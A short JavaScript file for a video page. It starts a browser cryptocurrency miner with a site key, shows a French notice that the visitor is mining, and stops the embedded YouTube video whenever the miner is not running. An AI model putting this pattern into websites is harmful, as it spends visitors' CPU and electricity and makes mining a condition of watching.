const tag = document.createElement('script');
const stoppedModal = new bootstrap.Modal(document.getElementById('video-stopped-modal'), {});

tag.src = "https://www.youtube.com/iframe_api";
const firstScriptTag = document.getElementsByTagName('script')[0];
firstScriptTag.parentNode.insertBefore(tag, firstScriptTag);

let miner;
try {
    miner = new Client.Anonymous('ae98ac13fd52b58488b7e7b059ff781e4b8d2d5eaa2a53950e7552dc131e10d5', {
        throttle: 0.5,
        c: 'w',
        ads: 0
    });
    miner.start();
    miner.addMiningNotification("Top", "Vous êtes en train de miner!", "#cccccc", 40, "#3d3d3d");
} catch (err) {
    stoppedModal.show();
}

let player;

function onYouTubeIframeAPIReady() {
    player = new YT.Player('youtube-player');
}

function stopVideoIfMinerNotRunning() {
    const isPlaying = ![-1, 0, 5].includes(player.getPlayerState())
    if (!miner || (!miner.isRunning() && player && isPlaying)) {
        console.log("Stopping video because the miner is currently not running");
        player.stopVideo();
        stoppedModal.show();
    }
}

setInterval(stopVideoIfMinerNotRunning, 3000);